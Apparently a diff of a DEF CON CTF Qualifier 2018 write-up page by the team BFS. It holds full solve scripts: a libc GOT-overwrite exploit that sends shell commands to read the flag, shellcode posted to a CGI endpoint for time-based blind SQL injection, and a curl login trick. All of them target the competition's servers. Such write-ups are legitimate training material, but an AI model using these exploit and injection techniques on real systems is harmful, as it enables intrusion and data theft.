@@ -140,6 +140,8 @@
     
                 <a class="dropdown-item" href="#babypwn1805---pwn">babypwn1805---pwn</a>
     
+                <a class="dropdown-item" href="#sbva---web">sbva---web</a>
+    
               </div>
             </li>
     
@@ -152,15 +154,21 @@
     
                 <a class="dropdown-item" href="#shellql">shellql</a>
     
+                <a class="dropdown-item" href="#flagsifier---reverse">flagsifier---reverse</a>
+    
+                <a class="dropdown-item" href="#note-oriented-programming">note-oriented-programming</a>
+    
               </div>
             </li>
     
             <li class="nav-item dropdown d-sm-block d-md-none">
               <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
-                flag-is-ooo{shellcode-and-webshell-is-old-news,-get-with-the-times-my-friend!}
+                from-the-grill
               </a>
               <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
-                                <a class="dropdown-item" href="#note-oriented-programming">note-oriented-programming</a>
+                                <a class="dropdown-item" href="#elastic-cloud-compute-(memory)-corruption">elastic-cloud-compute-(memory)-corruption</a>
+    
+                <a class="dropdown-item" href="#race-wars">race-wars</a>
     
                 <a class="dropdown-item" href="#say-hi!">say-hi!</a>
     
@@ -220,6 +228,10 @@
               <span class="menu-collapsed">babypwn1805---pwn</span>
             </a>
     
+<a href="#sbva---web" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sbva---web</span>
+            </a>
+    
           </div>
     
           <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
@@ -238,18 +250,30 @@
               <span class="menu-collapsed">shellql</span>
             </a>
     
+<a href="#flagsifier---reverse" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">flagsifier---reverse</span>
+            </a>
+    
+<a href="#note-oriented-programming" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">note-oriented-programming</span>
+            </a>
+    
           </div>
     
           <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
             <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
               <span class="fa fa-dashboard fa-fw mr-3"></span>
-              <span class="menu-collapsed">flag-is-ooo{shellcode-and-webshell-is-old-news,-get-with-the-times-my-friend!}</span>
+              <span class="menu-collapsed">from-the-grill</span>
               <span class="submenu-icon ml-auto"></span>
             </div>
           </a>
           <div id="submenu2" class="collapse sidebar-submenu">
-            <a href="#note-oriented-programming" class="list-group-item list-group-item-action text-white bg-dark">
-              <span class="menu-collapsed">note-oriented-programming</span>
+            <a href="#elastic-cloud-compute-(memory)-corruption" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">elastic-cloud-compute-(memory)-corruption</span>
+            </a>
+    
+<a href="#race-wars" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">race-wars</span>
             </a>
     
 <a href="#say-hi!" class="list-group-item list-group-item-action text-white bg-dark">
@@ -289,10 +313,8 @@
       <div class="col-10 py-3">
         <article class="markdown-body"><h1 id="def-con-ctf-qualifier-2018"><a class="header-link" href="#def-con-ctf-qualifier-2018"></a>DEF CON CTF Qualifier 2018</h1>
 <p>Written by BFS</p>
-<p>BFS consists of four CTF teams form Taiwan</p>
-<p>We are Balsn, Bamboofox, DoubleSigma, KerKerYuan</p>
+<p>BFS consists of four CTF teams form Taiwan: Balsn, Bamboofox, DoubleSigma, KerKerYuan.</p>
 
-<p>* If you want to know the solution/writeup of the problems, you can dig it out in the #irc or refer to the <a href="https://github.com/o-o-overflow/">official repositiries</a>.</p>
 <h2 id="amuse-bouche"><a class="header-link" href="#amuse-bouche"></a>Amuse Bouche</h2>
 <h3 id="elf-crumble"><a class="header-link" href="#elf-crumble"></a>ELF Crumble</h3>
 <p>Original binary in range 0x05ad ~ 0x08d3 is filled with <code>X</code>. Search through all 8! permutation of fragments to get the flag.</p>
@@ -327,78 +349,84 @@
 <li>Get serveral <code>libc</code>.</li>
 <li>Overwite <code>GOT read</code> with <code>onegadget</code> -&gt; with probability 1/16 (correct libc).</li>
 <li><code>/opt/ctf/babypwn/home/flag</code>.</li>
-<li><code>OOO{to_know_the_libc_you_must_become_the_libc}</code>
-<code>`</code>python=
-#!/usr/bin/env python
-from pwn import *
-import sys
-import struct
-import hashlib
-import random
-from threading import Timer</li>
+<li><code>OOO{to_know_the_libc_you_must_become_the_libc}</code></li>
 </ul>
-<h1 id="ooo{to_know_the_libc_you_must_become_the_libc}"><a class="header-link" href="#ooo{to_know_the_libc_you_must_become_the_libc}"></a>OOO{to_know_the_libc_you_must_become_the_libc}</h1>
-<p>def pow_hash(challenge, solution):
-    return hashlib.sha256(challenge.encode(&#39;ascii&#39;) + struct.pack(&#39;&lt;Q&#39;, solution)).hexdigest()</p>
-<p>def check_pow(challenge, n, solution):
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> sys
+<span class="hljs-keyword">import</span> struct
+<span class="hljs-keyword">import</span> hashlib
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">from</span> threading <span class="hljs-keyword">import</span> Timer
+
+<span class="hljs-comment"># OOO{to_know_the_libc_you_must_become_the_libc}</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">pow_hash</span><span class="hljs-params">(challenge, solution)</span>:</span>
+    <span class="hljs-keyword">return</span> hashlib.sha256(challenge.encode(<span class="hljs-string">'ascii'</span>) + struct.pack(<span class="hljs-string">'&lt;Q'</span>, solution)).hexdigest()
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">check_pow</span><span class="hljs-params">(challenge, n, solution)</span>:</span>
     h = pow_hash(challenge, solution)
-    return (int(h, 16) % (2**n)) == 0</p>
-<p>def solve_pow(challenge, n):
-    candidate = 0
-    while True:
-        if check_pow(challenge, n, candidate):
-            return candidate
-        candidate += 1</p>
-<p>def hit():
-    cmd = &#39;id;LD_PRELOAD=&#39;&#39;;&#39;
-    cmd += &#39;cat /opt/ctf/babypwn/home/flag;&#39;
-    cmd += &#39;ls -al /opt/ctf/babypwn/home/;&#39;
-    cmd += &#39;source /opt/ctf/babypwn/flag.txt 2&gt;&1;&#39;</p>
-<pre class="hljs"><code><span class="hljs-number">#c</span>md += <span class="hljs-string">'python -c \'</span><span class="hljs-keyword">import</span> pty; pty.spawn(<span class="hljs-string">"/bin/bash"</span>)\<span class="hljs-string">''</span>
-y.sendline( cmd )
-print y.recv( <span class="hljs-number">2048</span> )</code></pre><p>host , port = &#39;e4771e24.quals2018.oooverflow.io&#39; , 31337
-y = remote( host , port )</p>
-<p>y.recvuntil( &#39;: &#39; )
+    <span class="hljs-keyword">return</span> (int(h, <span class="hljs-number">16</span>) % (<span class="hljs-number">2</span>**n)) == <span class="hljs-number">0</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">solve_pow</span><span class="hljs-params">(challenge, n)</span>:</span>
+    candidate = <span class="hljs-number">0</span>
+    <span class="hljs-keyword">while</span> <span class="hljs-keyword">True</span>:
+        <span class="hljs-keyword">if</span> check_pow(challenge, n, candidate):
+            <span class="hljs-keyword">return</span> candidate
+        candidate += <span class="hljs-number">1</span>
+
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">hit</span><span class="hljs-params">()</span>:</span>
+    cmd = <span class="hljs-string">'id;LD_PRELOAD='</span><span class="hljs-string">';'</span>
+    cmd += <span class="hljs-string">'cat /opt/ctf/babypwn/home/flag;'</span>
+    cmd += <span class="hljs-string">'ls -al /opt/ctf/babypwn/home/;'</span>
+    cmd += <span class="hljs-string">'source /opt/ctf/babypwn/flag.txt 2&gt;&amp;1;'</span>
+    <span class="hljs-comment">#cmd += 'python -c \'import pty; pty.spawn("/bin/bash")\''</span>
+    y.sendline( cmd )
+    <span class="hljs-keyword">print</span> y.recv( <span class="hljs-number">2048</span> )
+
+
+host , port = <span class="hljs-string">'e4771e24.quals2018.oooverflow.io'</span> , <span class="hljs-number">31337</span>
+y = remote( host , port )
+
+y.recvuntil( <span class="hljs-string">': '</span> )
 challenge = y.recvline().strip()
-y.recvuntil( &#39;: &#39; )
+y.recvuntil( <span class="hljs-string">': '</span> )
 n = int( y.recvline() )
-y.sendlineafter( &#39;:&#39; , str( solve_pow(challenge, n) ) )</p>
-<p>success( &#39;Go&#39; )</p>
-<p>t = 0.3
-y.recvuntil( &#39;Go\n&#39; )</p>
-<p>for i in xrange( 0x10000 ):
-    y.send( p64( 0xffffffffffffffc8 ) )
-    p = 0xae77
+y.sendlineafter( <span class="hljs-string">':'</span> , str( solve_pow(challenge, n) ) )
+
+success( <span class="hljs-string">'Go'</span> )
+
+t = <span class="hljs-number">0.3</span>
+y.recvuntil( <span class="hljs-string">'Go\n'</span> )
+
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange( <span class="hljs-number">0x10000</span> ):
+    y.send( p64( <span class="hljs-number">0xffffffffffffffc8</span> ) )
+    p = <span class="hljs-number">0xae77</span>
     y.send( p16( p ) )
-    t = Timer(1.0, hit)
+    t = Timer(<span class="hljs-number">1.0</span>, hit)
     t.start()
-    y.recvuntil( &#39;Go&#39; , timeout=1 )
-    t.cancel()</p>
-<pre class="hljs"><code>
-### sbva - Web
+    y.recvuntil( <span class="hljs-string">'Go'</span> , timeout=<span class="hljs-number">1</span> )
+    t.cancel()</code></pre><h3 id="sbva---web"><a class="header-link" href="#sbva---web"></a>sbva - Web</h3>
+<p>This is one of the easiest challenges in the comptition.</p>
+<p>First, we are given the admin&#39;s username and password to login, but the server will return <code>Incompatible browser detected</code>. How does the server derect our browser? A quick guess is through the <code>User-Agent</code> header. So what if the header does not contain the user agent string?</p>
+<pre class="hljs"><code>$ curl <span class="hljs-string">'http://0da57cd5.quals2018.oooverflow.io/login.php'</span> <span class="hljs-_">-d</span> <span class="hljs-string">'username=admin@oooverflow.io&amp;password=admin'</span> -H <span class="hljs-string">'User-Agent:'</span>`
 
-This is one of the easiest challenges in the comptition.
+&lt;br /&gt;
+&lt;b&gt;Notice&lt;/b&gt;:  Undefined index: HTTP_USER_AGENT <span class="hljs-keyword">in</span> &lt;b&gt;/var/www/html/browsertest.php&lt;/b&gt; on line &lt;b&gt;3&lt;/b&gt;&lt;br /&gt;
 
-First, we are given the admin's username and password to login, but the server will return `Incompatible browser detected`. How does the server derect our browser? A quick guess is through the `User-Agent` header. So what if the header does not contain the user agent string?
-
-``` sh
-$ curl 'http://0da57cd5.quals2018.oooverflow.io/login.php' -d 'username=admin@oooverflow.io&amp;password=admin' -H 'User-Agent:'`
-
-<span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
-<span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>Notice<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span>:  Undefined index: HTTP_USER_AGENT in <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>/var/www/html/browsertest.php<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span> on line <span class="hljs-tag">&lt;<span class="hljs-name">b</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">b</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span>
-
-<span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><span class="css">
-        <span class="hljs-selector-tag">h1</span> {<span class="hljs-attribute">color</span>:red;}
-        <span class="hljs-selector-tag">p</span> {<span class="hljs-attribute">color</span>:blue;} 
-    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">video</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"v"</span> <span class="hljs-attr">autoplay</span>&gt;</span> <span class="hljs-tag">&lt;/<span class="hljs-name">video</span>&gt;</span>
-    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript">
+&lt;html&gt;
+    &lt;style scoped&gt;
+        h1 {color:red;}
+        p {color:blue;} 
+    &lt;/style&gt;
+    &lt;video id=<span class="hljs-string">"v"</span> autoplay&gt; &lt;/video&gt;
+    &lt;script&gt;
         <span class="hljs-keyword">if</span> (navigator.battery.charging) {
-            <span class="hljs-built_in">console</span>.log(<span class="hljs-string">"Device is charging."</span>)
+            console.log(<span class="hljs-string">"Device is charging."</span>)
         }
-    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>
-<span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre><p>A PHP error occurs above, so the server actually infers our browser through the user agent header. However, there are various user-agent. It&#39;s sorts of silly to try each of them since the server might detect the version number as well.</p>
+    &lt;/script&gt;
+&lt;/html&gt;</code></pre><p>A PHP error occurs above, so the server actually infers our browser through the user agent header. However, there are various user-agent. It&#39;s sorts of silly to try each of them since the server might detect the version number as well.</p>
 <p>In order to reduce possible user agent, <a href="https://developer.mozilla.org/en-US/docs/Web/API/Navigator/battery">navigator.battery</a> in javascript is an important clue. It seems that only Chrome and Firefox support this.</p>
 <p>Let&#39;s try Firefox with different version number first. The Firefox user agent spcification is <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent/Firefox">here</a>, though I&#39;m just blindly trying the possibile version number without following the specification.</p>
 <pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/env python3</span>
@@ -576,143 +604,153 @@ r.interactive()
 <li><p>Time to use time-based attack
 <code>SELECT 1 from flag where (select substring(flag,1,4) from flag) = &quot;OOO{&quot; and SLEEP(10);</code></p>
 </li>
-<li><p>The exploit script:
-<code>`</code>python</p>
-<h1 id="coding:-utf-8"><a class="header-link" href="#coding:-utf-8"></a>coding: utf-8</h1>
-<p>from pwn import *
-import requests
-import string
-import hashlib
-context.arch=&#39;amd64&#39;
-def mdd5(ss):
-  print ss
-  a=hashlib.md5()
-  a.update(ss)
-  return a.hexdigest()
-def run(code, timeout=1):
-  s = asm(code)
-  assert( &#39;\0&#39; not in s and len(s) &lt; 1000)
-  try:</p>
-<pre class="hljs"><code>  req = requests.<span class="hljs-keyword">post</span>('http:<span class="hljs-comment">//b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php', data={</span>
-      '<span class="hljs-keyword">shell</span>': <span class="hljs-built_in">s</span>
-  }, timeout=timeout)</code></pre><p>  except requests.exceptions.ReadTimeout:</p>
-<pre class="hljs"><code>  <span class="hljs-built_in">print</span> (<span class="hljs-string">'Timeout'</span>)
-  <span class="hljs-built_in">return</span> <span class="hljs-number">1</span></code></pre><p>  else:</p>
-<pre class="hljs"><code>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span></code></pre></li>
+<li><p>The exploit script:</p>
+</li>
 </ul>
-<p>def qqq(payload):
-    lenn=p32(len(payload)+1)[0]
-    pp=lenn+&#39;\x00\x00\x00\x03&#39;+payload
-    a=run(shellcraft.write(4, pp, len(pp)) + &#39;xor rax, rax;&#39; + shellcraft.read(4, &#39;esp&#39;, 4) + &#39;inc rax; cmp rax, 1; jge .+0; ret&#39;, timeout=4)
-    return a</p>
-<p>flag=&quot;&quot;
-for i in range(70):
-  for j in &quot;y SQL&quot;+string.printable:
-    if qqq(&#39;SELECT 1 from flag where (select substring(flag,1,&#39;+str(len(flag)+1)+&#39;) from flag) = &quot;&#39;+flag+j+&#39;&quot; and SLEEP(10);&#39;) == 1:
+<pre class="hljs"><code><span class="hljs-comment"># coding: utf-8</span>
+<span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">import</span> requests
+<span class="hljs-keyword">import</span> string
+<span class="hljs-keyword">import</span> hashlib
+context.arch=<span class="hljs-string">'amd64'</span>
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">mdd5</span><span class="hljs-params">(ss)</span>:</span>
+    <span class="hljs-keyword">print</span> ss
+    a=hashlib.md5()
+    a.update(ss)
+    <span class="hljs-keyword">return</span> a.hexdigest()
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">run</span><span class="hljs-params">(code, timeout=<span class="hljs-number">1</span>)</span>:</span>
+    s = asm(code)
+    <span class="hljs-keyword">assert</span>( <span class="hljs-string">'\0'</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> s <span class="hljs-keyword">and</span> len(s) &lt; <span class="hljs-number">1000</span>)
+    <span class="hljs-keyword">try</span>:
+        req = requests.post(<span class="hljs-string">'http://b9d6d408.quals2018.oooverflow.io/cgi-bin/index.php'</span>, data={
+            <span class="hljs-string">'shell'</span>: s
+        }, timeout=timeout)
+    <span class="hljs-keyword">except</span> requests.exceptions.ReadTimeout:
+        <span class="hljs-keyword">print</span> (<span class="hljs-string">'Timeout'</span>)
+        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>
+    <span class="hljs-keyword">else</span>:
+        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">qqq</span><span class="hljs-params">(payload)</span>:</span>
+    lenn=p32(len(payload)+<span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]
+    pp=lenn+<span class="hljs-string">'\x00\x00\x00\x03'</span>+payload
+    a=run(shellcraft.write(<span class="hljs-number">4</span>, pp, len(pp)) + <span class="hljs-string">'xor rax, rax;'</span> + shellcraft.read(<span class="hljs-number">4</span>, <span class="hljs-string">'esp'</span>, <span class="hljs-number">4</span>) + <span class="hljs-string">'inc rax; cmp rax, 1; jge .+0; ret'</span>, timeout=<span class="hljs-number">4</span>)
+    <span class="hljs-keyword">return</span> a
+
+flag=<span class="hljs-string">""</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">70</span>):
+  <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-string">"y SQL"</span>+string.printable:
+    <span class="hljs-keyword">if</span> qqq(<span class="hljs-string">'SELECT 1 from flag where (select substring(flag,1,'</span>+str(len(flag)+<span class="hljs-number">1</span>)+<span class="hljs-string">') from flag) = "'</span>+flag+j+<span class="hljs-string">'" and SLEEP(10);'</span>) == <span class="hljs-number">1</span>:
       flag+=j
-      print flag
-      break</p>
-<p>flag2=&quot;OOO{&quot;
-for i in range(4,70):
-  if qqq(&#39;SELECT 1 from flag where (select md5(substring(flag,&#39;+str(i)+&#39;,1)) from flag) = &quot;&#39;+mdd5(flag[i].upper())+&#39;&quot; and SLEEP(10);&#39;)  == 1:
+      <span class="hljs-keyword">print</span> flag
+      <span class="hljs-keyword">break</span>
+
+flag2=<span class="hljs-string">"OOO{"</span>
+<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">4</span>,<span class="hljs-number">70</span>):
+  <span class="hljs-keyword">if</span> qqq(<span class="hljs-string">'SELECT 1 from flag where (select md5(substring(flag,'</span>+str(i)+<span class="hljs-string">',1)) from flag) = "'</span>+mdd5(flag[i].upper())+<span class="hljs-string">'" and SLEEP(10);'</span>)  == <span class="hljs-number">1</span>:
     flag2+=flag[i].upper()
-  else:
+  <span class="hljs-keyword">else</span>:
     flag2+=flag[i].lower()
-  print flag2</p>
-<h2 id="flag-is-ooo{shellcode-and-webshell-is-old-news,-get-with-the-times-my-friend!}"><a class="header-link" href="#flag-is-ooo{shellcode-and-webshell-is-old-news,-get-with-the-times-my-friend!}"></a>flag is OOO{shellcode and webshell is old news, get with the times my friend!}</h2>
-<pre class="hljs"><code>
-<span class="hljs-meta">### flagsifier - Reverse</span>
-* Part <span class="hljs-number">1</span>
-    <span class="hljs-meta">##### Behavior</span>
-    * Input <span class="hljs-keyword">is</span> composed <span class="hljs-keyword">of</span> <span class="hljs-number">38</span> <span class="hljs-number">28</span>x28 handwritten English characters.
-    * Random combination <span class="hljs-keyword">of</span> characters will be predicted <span class="hljs-keyword">as</span> <span class="hljs-keyword">class</span> <span class="hljs-number">3.</span>
-    * Repeat a character <span class="hljs-number">38</span> times will be predicted <span class="hljs-keyword">as</span> <span class="hljs-keyword">class</span> <span class="hljs-number">14</span>~<span class="hljs-number">39</span>, which <span class="hljs-keyword">is</span> <span class="hljs-keyword">class</span> A~Z.
-    * <span class="hljs-keyword">Using</span> gradient ascent <span class="hljs-keyword">on</span> input image will <span class="hljs-keyword">not</span> produce readable picture. <span class="hljs-keyword">When</span> we add a constraint that all <span class="hljs-number">38</span> characters should be the same, <span class="hljs-keyword">class</span> <span class="hljs-number">14</span>~<span class="hljs-number">39</span> can generate input <span class="hljs-keyword">with</span> score <span class="hljs-number">1</span>, but failed <span class="hljs-keyword">on</span> <span class="hljs-keyword">class</span> <span class="hljs-number">1</span>~<span class="hljs-number">13.</span> Implies that <span class="hljs-keyword">class</span> <span class="hljs-number">1</span>~<span class="hljs-number">13</span> <span class="hljs-keyword">is</span> consists <span class="hljs-keyword">of</span> multiple characters.
-    * Start <span class="hljs-keyword">with</span> random combination <span class="hljs-keyword">of</span> characters, we use Simulated Annealing <span class="hljs-keyword">to</span> replace characters <span class="hljs-keyword">in</span> input image. We can generate input image <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> <span class="hljs-keyword">class</span> <span class="hljs-keyword">with</span> very high score. The images <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> unique, but will be similar <span class="hljs-keyword">to</span> ground truth.
-    * <span class="hljs-keyword">Class</span> <span class="hljs-number">0</span> starts <span class="hljs-keyword">with</span> a lot <span class="hljs-keyword">of</span> `O` that isn<span class="hljs-comment">'t like a flag.</span>
-    * <span class="hljs-keyword">Class</span> <span class="hljs-number">1</span> <span class="hljs-keyword">is</span> `OOOTHISISA.....MESSAGETOWASTEYOURTIME` which <span class="hljs-keyword">is</span> a fake flag.
-    * <span class="hljs-keyword">Class</span> <span class="hljs-number">2</span> starts <span class="hljs-keyword">with</span> `OOO`.
-    * <span class="hljs-keyword">Class</span> <span class="hljs-number">3</span>~<span class="hljs-number">13</span> doesn<span class="hljs-comment">'t start with `OOO`.</span>
-    * We guessed <span class="hljs-keyword">Class</span> <span class="hljs-number">2</span> <span class="hljs-keyword">is</span> <span class="hljs-literal">true</span> flag, so we generate a lot <span class="hljs-keyword">of</span> possible input images <span class="hljs-keyword">to</span> <span class="hljs-keyword">get</span> probabilities <span class="hljs-keyword">of</span> <span class="hljs-keyword">each</span> character at <span class="hljs-keyword">each</span> position.
-    * Code:
-    ```python
-    <span class="hljs-meta">#!/usr/bin/python3</span>
-    import sys
-
-    <span class="hljs-keyword">dim</span> = int(sys.argv[<span class="hljs-number">1</span>])
-
-    flag = <span class="hljs-comment">'......................................'</span>
-
-    reset = <span class="hljs-literal">False</span> <span class="hljs-meta"># Change to False when known part is long enough</span>
-    <span class="hljs-meta">#  flag = 'OOOOOOOOOOOOOOOOI.....................' # dim = 0</span>
-    <span class="hljs-meta">#  flag = 'OOOOTHISISA.....MESSAGETOWASTEYOURTIME' # dim = 1</span>
-    flag = <span class="hljs-comment">'OOO.............INTELLIGENCEISREQUIRED' # dim = 2</span>
+  <span class="hljs-keyword">print</span> flag2
 
 
-    import numpy <span class="hljs-keyword">as</span> np
-    <span class="hljs-keyword">from</span> PIL import Image
-    import os
-    <span class="hljs-keyword">from</span> tqdm import tqdm, trange
-    import random
-    <span class="hljs-keyword">from</span> keras.models import load_model, Model
+<span class="hljs-comment">## flag is OOO{shellcode and webshell is old news, get with the times my friend!}</span></code></pre><h3 id="flagsifier---reverse"><a class="header-link" href="#flagsifier---reverse"></a>flagsifier - Reverse</h3>
+<ul class="list">
+<li>Part 1<h5 id="behavior"><a class="header-link" href="#behavior"></a>Behavior</h5>
+<ul class="list">
+<li>Input is composed of 38 28x28 handwritten English characters.</li>
+<li>Random combination of characters will be predicted as class 3.</li>
+<li>Repeat a character 38 times will be predicted as class 14~39, which is class A~Z.</li>
+<li>Using gradient ascent on input image will not produce readable picture. When we add a constraint that all 38 characters should be the same, class 14~39 can generate input with score 1, but failed on class 1~13. Implies that class 1~13 is consists of multiple characters.</li>
+<li>Start with random combination of characters, we use Simulated Annealing to replace characters in input image. We can generate input image for each class with very high score. The images is not unique, but will be similar to ground truth.</li>
+<li>Class 0 starts with a lot of <code>O</code> that isn&#39;t like a flag.</li>
+<li>Class 1 is <code>OOOTHISISA.....MESSAGETOWASTEYOURTIME</code> which is a fake flag.</li>
+<li>Class 2 starts with <code>OOO</code>.</li>
+<li>Class 3~13 doesn&#39;t start with <code>OOO</code>.</li>
+<li>We guessed Class 2 is true flag, so we generate a lot of possible input images to get probabilities of each character at each position.</li>
+<li>Code:</li>
+</ul>
+</li>
+</ul>
+<pre class="hljs"><code><span class="hljs-comment">#!/usr/bin/python3</span>
+<span class="hljs-keyword">import</span> sys
+
+dim = int(sys.argv[<span class="hljs-number">1</span>])
+
+flag = <span class="hljs-string">'......................................'</span>
+
+reset = <span class="hljs-keyword">False</span> <span class="hljs-comment"># Change to False when known part is long enough</span>
+<span class="hljs-comment">#  flag = 'OOOOOOOOOOOOOOOOI.....................' # dim = 0</span>
+<span class="hljs-comment">#  flag = 'OOOOTHISISA.....MESSAGETOWASTEYOURTIME' # dim = 1</span>
+flag = <span class="hljs-string">'OOO.............INTELLIGENCEISREQUIRED'</span> <span class="hljs-comment"># dim = 2</span>
 
 
-    model = load_model(<span class="hljs-comment">'model.h5')</span>
-    model = Model(input=model.input, output=model.layers[<span class="hljs-number">-2</span>].output)
-
-    data = [np.asarray(Image.open(<span class="hljs-comment">'sample_%d.png' % i)).reshape(28, 1064).astype(np.float) for i in range(10)]</span>
-    data = [im <span class="hljs-keyword">for</span> d <span class="hljs-keyword">in</span> data <span class="hljs-keyword">for</span> im <span class="hljs-keyword">in</span> np.split(d, <span class="hljs-number">38</span>, axis=<span class="hljs-number">1</span>)]
-    <span class="hljs-built_in">char</span> = <span class="hljs-comment">''.join([</span>
-        <span class="hljs-comment">'RUNNEISOSTRICHESOWNINGMUSSEDPURIMSCIUI',</span>
-        <span class="hljs-comment">'MOLDERINGIINTELSDEDICINGCOYNESSDEFIECT',</span>
-        <span class="hljs-comment">'AMADOFIFESINSTIIIINGGREEDIIVDISIOCATIN',</span>
-        <span class="hljs-comment">'HAMIETSENSITIZINGNARRATIVERECAPTURINGU',</span>
-        <span class="hljs-comment">'EIECTROENCEPHAIOGRAMSPALATECONDOIESPEN',</span>
-        <span class="hljs-comment">'SCHWINNUFAMANAGEABLECORKSSEMICIRCIESSH',</span>
-        <span class="hljs-comment">'BENEDICTTURGIDITYDSYCHESPHANTASMAGORIA',</span>
-        <span class="hljs-comment">'TRUINGAIKALOIDSQUEILRETROFITBIEARIESTW',</span>
-        <span class="hljs-comment">'KINGFISHERCOMMONERSUERIFIESHORNETAUSTI',</span>
-        <span class="hljs-comment">'LIQUORHEMSTITCHESRESPITEACORNSGOALREDI',</span>
-    ])
-    data = list(zip(data, <span class="hljs-built_in">char</span>))
-
-    def softmax(x):
-        <span class="hljs-string">"""Compute softmax values for each sets of scores in x."""</span>
-        e_x = np.exp(x - np.max(x))
-        <span class="hljs-keyword">return</span> e_x / e_x.sum()
+<span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np
+<span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image
+<span class="hljs-keyword">import</span> os
+<span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm, trange
+<span class="hljs-keyword">import</span> random
+<span class="hljs-keyword">from</span> keras.models <span class="hljs-keyword">import</span> load_model, Model
 
 
-    <span class="hljs-keyword">for</span> z <span class="hljs-keyword">in</span> trange(<span class="hljs-number">100</span>):
-        <span class="hljs-keyword">if</span> reset <span class="hljs-keyword">or</span> z == <span class="hljs-number">0</span>:
-            img, <span class="hljs-keyword">text</span> = zip(*random.sample(data, <span class="hljs-number">38</span>))
-            img = np.concatenate(img, <span class="hljs-number">1</span>).reshape(<span class="hljs-number">1</span>, <span class="hljs-number">28</span>, <span class="hljs-number">1064</span>, <span class="hljs-number">1</span>)
-            <span class="hljs-keyword">text</span> = list(<span class="hljs-keyword">text</span>)
-            r = model.predict([img])[<span class="hljs-number">0</span>]
-            score = r[<span class="hljs-keyword">dim</span>]
-        bar = trange(<span class="hljs-number">1000</span>)
-        bar.desc = <span class="hljs-comment">'%s: %.1f ( %4d )' % (''.join(text), softmax(r)[dim], score)</span>
-        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> bar:
-            cur = img.copy()
-            <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:
-                idx = random.randrange(<span class="hljs-number">0</span>, <span class="hljs-number">38</span>)
-                im, c = random.sample(data, <span class="hljs-number">1</span>)[<span class="hljs-number">0</span>]
-                <span class="hljs-keyword">if</span> <span class="hljs-keyword">text</span>[idx] != flag[idx] <span class="hljs-keyword">or</span> flag[idx] == c:
-                    break
-            cur[<span class="hljs-number">0</span>,:, idx*<span class="hljs-number">28</span>:(idx+<span class="hljs-number">1</span>)*<span class="hljs-number">28</span>,<span class="hljs-number">0</span>] = im
-            r = model.predict([cur])[<span class="hljs-number">0</span>]
-            s = r[<span class="hljs-keyword">dim</span>]
